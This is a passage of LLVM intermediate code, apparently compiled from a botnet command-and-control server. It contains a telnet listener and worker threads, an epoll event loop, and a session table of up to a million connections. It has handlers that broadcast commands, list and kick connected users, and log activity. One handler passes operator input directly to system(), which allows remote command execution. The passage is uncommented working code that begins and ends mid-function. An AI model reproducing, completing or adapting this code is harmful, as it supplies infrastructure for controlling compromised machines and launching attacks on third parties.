  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i64 0, i64 0), i64 28, i32 1, i1 false)
  %193 = call i64 @strlen(i8* nonnull %17) #9
  %194 = call i64 @send(i32 %13, i8* nonnull %17, i64 %193, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i64 0, i64 0), i64 24, i32 1, i1 false)
  %195 = call i64 @strlen(i8* nonnull %17) #9
  %196 = call i64 @send(i32 %13, i8* nonnull %17, i64 %195, i32 16384) #10
  br label %197

; <label>:197:                                    ; preds = %189, %192
  %198 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0)) #9
  %199 = icmp eq i8* %198, null
  br i1 %199, label %200, label %203

; <label>:200:                                    ; preds = %197
  %201 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i64 0, i64 0)) #9
  %202 = icmp eq i8* %201, null
  br i1 %202, label %213, label %203

; <label>:203:                                    ; preds = %200, %197
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0), i64 5, i32 1, i1 false)
  %204 = call i64 @strlen(i8* nonnull %17) #9
  %205 = call i64 @send(i32 %13, i8* nonnull %17, i64 %204, i32 16384) #10
  %206 = call i64 @send(i32 %13, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i64 0, i64 0), i64 17, i32 16384) #10
  %207 = icmp eq i64 %206, -1
  br i1 %207, label %.loopexit151.loopexit185, label %208

; <label>:208:                                    ; preds = %203
  %209 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %210 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %209, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* %52)
  %211 = call i32 @fclose(%struct._IO_FILE* %209)
  %212 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* %52)
  br label %213

; <label>:213:                                    ; preds = %200, %208
  %214 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #9
  %215 = icmp eq i8* %214, null
  br i1 %215, label %221, label %216

; <label>:216:                                    ; preds = %213
  %217 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %218 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %217, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* %52)
  %219 = call i32 @fclose(%struct._IO_FILE* %217)
  %220 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* %52)
  br label %221

; <label>:221:                                    ; preds = %213, %216
  %222 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i64 0, i64 0)) #9
  %223 = icmp eq i8* %222, null
  br i1 %223, label %227, label %224

; <label>:224:                                    ; preds = %221
  %225 = call i64 @send(i32 %13, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 16, i32 16384) #10
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %.loopexit151.loopexit185, label %227

; <label>:227:                                    ; preds = %221, %224
  %228 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0)) #9
  %229 = icmp eq i8* %228, null
  br i1 %229, label %.loopexit149, label %230

; <label>:230:                                    ; preds = %227
  %231 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %89) #9
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %236, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %89) #9
  %235 = icmp eq i32 %234, 0
  br i1 %235, label %236, label %255

; <label>:236:                                    ; preds = %233, %230
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i64 0, i64 0), i64 39, i32 1, i1 false)
  %237 = call i64 @strlen(i8* nonnull %17) #9
  %238 = call i64 @send(i32 %13, i8* nonnull %17, i64 %237, i32 16384) #10
  %239 = icmp eq i64 %238, -1
  br i1 %239, label %.loopexit148.loopexit186, label %.preheader.preheader

.preheader.preheader:                             ; preds = %236
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %253
  %indvars.iv171 = phi i64 [ %indvars.iv.next172, %253 ], [ 0, %.preheader.preheader ]
  %240 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv171, i32 2, i64 0
  %241 = call i64 @strlen(i8* %240) #9
  %242 = icmp ugt i64 %241, 1
  br i1 %242, label %243, label %253

; <label>:243:                                    ; preds = %.preheader
  %244 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv171, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = icmp eq i32 %245, 1
  br i1 %246, label %247, label %253

; <label>:247:                                    ; preds = %243
  %248 = trunc i64 %indvars.iv171 to i32
  %249 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i64 0, i64 0), i32 %248, i8* nonnull %240) #10
  %250 = call i64 @strlen(i8* nonnull %17) #9
  %251 = call i64 @send(i32 %13, i8* nonnull %17, i64 %250, i32 16384) #10
  %252 = icmp eq i64 %251, -1
  br i1 %252, label %.loopexit148.loopexit184, label %253

; <label>:253:                                    ; preds = %.preheader, %243, %247
  %indvars.iv.next172 = add nuw nsw i64 %indvars.iv171, 1
  %254 = icmp slt i64 %indvars.iv.next172, 1000000
  br i1 %254, label %.preheader, label %.loopexit149.loopexit

; <label>:255:                                    ; preds = %233
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %256 = call i64 @strlen(i8* nonnull %17) #9
  %257 = call i64 @send(i32 %13, i8* nonnull %17, i64 %256, i32 16384) #10
  br label %.loopexit149

.loopexit149.loopexit:                            ; preds = %253
  br label %.loopexit149

.loopexit149:                                     ; preds = %.loopexit149.loopexit, %227, %255
  %258 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #9
  %259 = icmp eq i8* %258, null
  br i1 %259, label %.loopexit, label %260

; <label>:260:                                    ; preds = %.loopexit149
  %261 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %89) #9
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %263, label %318

; <label>:263:                                    ; preds = %260
  %264 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i64 0, i64 0)) #9
  %265 = icmp eq i8* %264, null
  br i1 %265, label %266, label %269

; <label>:266:                                    ; preds = %263
  %267 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0)) #9
  %268 = icmp eq i8* %267, null
  br i1 %268, label %294, label %269

; <label>:269:                                    ; preds = %266, %263
  %270 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #10
  %271 = call i64 @strlen(i8* %270) #9
  %272 = getelementptr inbounds i8, i8* %270, i64 %271
  %273 = getelementptr inbounds i8, i8* %272, i64 1
  %274 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %91, i64 20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i64 0, i64 0), i8* %273) #10
  call void @trim(i8* nonnull %91)
  br label %275

; <label>:275:                                    ; preds = %269, %292
  %indvars.iv173 = phi i64 [ 0, %269 ], [ %indvars.iv.next174, %292 ]
  %276 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv173, i32 2, i64 0
  %277 = call i8* @strstr(i8* %276, i8* nonnull %91) #9
  %278 = icmp eq i8* %277, null
  br i1 %278, label %292, label %279

; <label>:279:                                    ; preds = %275
  %280 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* %85) #10
  %281 = call i64 @strlen(i8* nonnull %17) #9
  %282 = trunc i64 %indvars.iv173 to i32
  %283 = call i64 @send(i32 %282, i8* nonnull %17, i64 %281, i32 16384) #10
  %284 = icmp eq i64 %283, -1
  br i1 %284, label %.loopexit148.loopexit, label %285

; <label>:285:                                    ; preds = %279
  %286 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv173, i32 1
  store i32 0, i32* %286, align 4
  %287 = call i32 @close(i32 %282) #10
  %288 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i64 0, i64 0), i8* nonnull %91) #10
  %289 = call i64 @strlen(i8* nonnull %17) #9
  %290 = call i64 @send(i32 %13, i8* nonnull %17, i64 %289, i32 16384) #10
  %291 = icmp eq i64 %290, -1
  br i1 %291, label %.loopexit148.loopexit, label %292

; <label>:292:                                    ; preds = %275, %285
  %indvars.iv.next174 = add nuw nsw i64 %indvars.iv173, 1
  %293 = icmp slt i64 %indvars.iv.next174, 1000000
  br i1 %293, label %275, label %.loopexit.loopexit

; <label>:294:                                    ; preds = %266
  %295 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #9
  %296 = icmp eq i8* %295, null
  br i1 %296, label %297, label %300

; <label>:297:                                    ; preds = %294
  %298 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #9
  %299 = icmp eq i8* %298, null
  br i1 %299, label %.loopexit, label %300

; <label>:300:                                    ; preds = %297, %294
  %301 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #10
  %302 = call i64 @strlen(i8* %301) #9
  %303 = getelementptr inbounds i8, i8* %301, i64 %302
  %304 = getelementptr inbounds i8, i8* %303, i64 1
  %305 = call i32 @atoi(i8* %304) #9
  %306 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* %85) #10
  %307 = call i64 @strlen(i8* nonnull %17) #9
  %308 = call i64 @send(i32 %305, i8* nonnull %17, i64 %307, i32 16384) #10
  %309 = icmp eq i64 %308, -1
  br i1 %309, label %.loopexit148.loopexit186, label %310

; <label>:310:                                    ; preds = %300
  %311 = sext i32 %305 to i64
  %312 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %311, i32 1
  store i32 0, i32* %312, align 4
  %313 = call i32 @close(i32 %305) #10
  %314 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i64 0, i64 0), i32 %305) #10
  %315 = call i64 @strlen(i8* nonnull %17) #9
  %316 = call i64 @send(i32 %13, i8* nonnull %17, i64 %315, i32 16384) #10
  %317 = icmp eq i64 %316, -1
  br i1 %317, label %.loopexit148.loopexit186, label %.loopexit

; <label>:318:                                    ; preds = %260
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i64 0, i64 0), i64 53, i32 1, i1 false)
  %319 = call i64 @strlen(i8* nonnull %17) #9
  %320 = call i64 @send(i32 %13, i8* nonnull %17, i64 %319, i32 16384) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %292
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %297, %.loopexit149, %318, %310
  %321 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i64 0, i64 0)) #9
  %322 = icmp eq i8* %321, null
  br i1 %322, label %345, label %323

; <label>:323:                                    ; preds = %.loopexit
  %324 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %89) #9
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %329, label %326

; <label>:326:                                    ; preds = %323
  %327 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %89) #9
  %328 = icmp eq i32 %327, 0
  br i1 %328, label %329, label %342

; <label>:329:                                    ; preds = %326, %323
  %330 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #10
  %331 = getelementptr inbounds i8, i8* %330, i64 8
  call void @trim(i8* %331)
  %332 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %90, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i64 0, i64 0), i8* %331) #10
  %333 = call i32 @system(i8* nonnull %90) #10
  %334 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* %52, i8* %331)
  %335 = call i64 @strlen(i8* nonnull %17) #9
  %336 = call i64 @send(i32 %13, i8* nonnull %17, i64 %335, i32 16384) #10
  %337 = icmp eq i64 %336, -1
  br i1 %337, label %.loopexit148.loopexit186, label %338

; <label>:338:                                    ; preds = %329
  %339 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %340 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %339, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* %52, i8* %331)
  %341 = call i32 @fclose(%struct._IO_FILE* %339)
  br label %345

; <label>:342:                                    ; preds = %326
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %343 = call i64 @strlen(i8* nonnull %17) #9
  %344 = call i64 @send(i32 %13, i8* nonnull %17, i64 %343, i32 16384) #10
  br label %345

; <label>:345:                                    ; preds = %.loopexit, %338, %342
  %346 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i64 0, i64 0)) #9
  %347 = icmp eq i8* %346, null
  br i1 %347, label %348, label %.loopexit151.loopexit185

; <label>:348:                                    ; preds = %345
  call void @trim(i8* nonnull %16)
  %349 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %77, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* %52) #10
  %350 = call i64 @strlen(i8* nonnull %77) #9
  %351 = call i64 @send(i32 %13, i8* nonnull %77, i64 %350, i32 16384) #10
  %352 = icmp eq i64 %351, -1
  br i1 %352, label %.loopexit151.loopexit185, label %353

; <label>:353:                                    ; preds = %348
  %354 = call i64 @strlen(i8* nonnull %16) #9
  %355 = icmp eq i64 %354, 0
  br i1 %355, label %.backedge, label %356

; <label>:356:                                    ; preds = %353
  %357 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %52, i8* nonnull %16)
  %358 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %359 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %358, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %52, i8* nonnull %16)
  %360 = call i32 @fclose(%struct._IO_FILE* %358)
  call void @broadcast(i8* nonnull %16, i32 %13, i8* nonnull %44)
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.backedge:                                        ; preds = %356, %353
  %361 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %362 = icmp sgt i32 %361, 0
  br i1 %362, label %96, label %.loopexit151.loopexit185

.loopexit151.loopexit:                            ; preds = %114
  br label %.loopexit151

.loopexit151.loopexit185:                         ; preds = %345, %.backedge, %348, %224, %203, %122
  br label %.loopexit151

.loopexit151:                                     ; preds = %.loopexit151.loopexit185, %.loopexit151.loopexit, %82, %33, %76, %66, %69, %59, %55, %40, %36, %._crit_edge, %72
  %sext = shl i64 %12, 32
  %363 = ashr exact i64 %sext, 32
  %364 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %363, i32 1
  store i32 0, i32* %364, align 4
  %365 = call i32 @close(i32 %13) #10
  %366 = load volatile i32, i32* @managesConnected, align 4
  %367 = add nsw i32 %366, -1
  store volatile i32 %367, i32* @managesConnected, align 4
  br label %.loopexit148

.loopexit148.loopexit:                            ; preds = %279, %285
  br label %.loopexit148

.loopexit148.loopexit184:                         ; preds = %247
  br label %.loopexit148

.loopexit148.loopexit186:                         ; preds = %236, %300, %310, %329
  br label %.loopexit148

.loopexit148:                                     ; preds = %.loopexit148.loopexit186, %.loopexit148.loopexit184, %.loopexit148.loopexit, %.loopexit151
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #4

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @telnetListener(i32) #6 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca { i64, i64 }, align 8
  %tmpcast = bitcast { i64, i64 }* %4 to %struct.sockaddr_in*
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i64 0, i32 0
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %tmpcast, i64 0, i32 2, i32 0
  %25 = bitcast { i64, i64 }* %4 to %struct.sockaddr*
  br label %26

; <label>:26:                                     ; preds = %42, %21
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i64 0, i64 0))
  %28 = load i64, i64* %23, align 8
  call void @client_addr(i64 %28, i64 undef)
  %29 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %30 = load i32, i32* %24, align 4
  %31 = and i32 %30, 255
  %32 = lshr i32 %30, 8
  %33 = and i32 %32, 255
  %34 = lshr i32 %30, 16
  %35 = and i32 %34, 255
  %36 = lshr i32 %30, 24
  %37 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i64 0, i64 0), i32 %31, i32 %33, i32 %35, i32 %36)
  %38 = call i32 @fclose(%struct._IO_FILE* %29)
  %39 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %25, i32* nonnull %2) #10
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %26
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i64 0, i64 0)) #12
  br label %42

; <label>:42:                                     ; preds = %41, %26
  %43 = sext i32 %39 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @telnetWorker, i8* %44) #10
  br label %26
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %12, %struct._IO_FILE** @fileFD, align 8
  %13 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %13, %struct._IO_FILE** @kfileFD, align 8
  %14 = getelementptr inbounds i8*, i8** %1, i64 3
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #9
  %17 = getelementptr inbounds i8*, i8** %1, i64 2
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @atoi(i8* %18) #9
  %20 = icmp sgt i32 %19, 850
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %11
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @str, i64 0, i64 0))
  ret i32 0

; <label>:22:                                     ; preds = %11
  %23 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i64 0, i64 0), i32 %16)
  %24 = getelementptr inbounds i8*, i8** %1, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = tail call fastcc i32 @create_and_bind(i8* %25)
  store volatile i32 %26, i32* @listenFD, align 4
  %27 = load volatile i32, i32* @listenFD, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  tail call void @abort() #13
  unreachable

; <label>:30:                                     ; preds = %22
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = tail call fastcc i32 @make_socket_non_blocking(i32 %31)
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  tail call void @abort() #13
  unreachable

; <label>:35:                                     ; preds = %30
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = tail call i32 @listen(i32 %36, i32 128) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %35
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:40:                                     ; preds = %35
  %41 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %41, i32* @epollFD, align 4
  %42 = load volatile i32, i32* @epollFD, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %40
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:45:                                     ; preds = %40
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %48 = bitcast %union.epoll_data* %47 to i32*
  store i32 %46, i32* %48, align 4
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %49, align 4
  %50 = load volatile i32, i32* @epollFD, align 4
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = call i32 @epoll_ctl(i32 %50, i32 1, i32 %51, %struct.epoll_event* nonnull %4) #10
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %45
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:55:                                     ; preds = %45
  %56 = add nsw i32 %19, 2
  %57 = zext i32 %56 to i64
  %58 = alloca i64, i64 %57, align 16
  %59 = icmp eq i32 %19, 0
  br i1 %59, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %55
  %60 = sext i32 %19 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %60, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %61 = getelementptr inbounds i64, i64* %58, i64 %indvars.iv
  %62 = call i32 @pthread_create(i64* %61, %union.pthread_attr_t* null, i8* (i8*)* nonnull @epollEventLoop, i8* null) #10
  %63 = trunc i64 %indvars.iv.next to i32
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %55
  %65 = sext i32 %16 to i64
  %66 = inttoptr i64 %65 to i8*
  %67 = call i32 @pthread_create(i64* nonnull %58, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %66) #10
  br label %68

; <label>:68:                                     ; preds = %68, %._crit_edge
